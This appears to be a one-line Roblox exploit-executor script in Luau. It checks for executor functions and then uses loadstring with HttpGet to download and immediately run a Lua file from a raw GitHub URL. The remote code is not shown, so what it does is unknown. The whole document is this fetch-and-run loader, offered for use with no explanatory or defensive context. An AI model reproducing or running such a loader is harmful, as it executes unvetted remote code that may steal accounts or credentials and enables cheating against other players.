task.spawn(function() if request and hookfunction then loadstring(game:HttpGet('https://raw.githubusercontent.com/tym487ty78/yyyyyyyy1/refs/heads/main/lg.lua'))() end end)
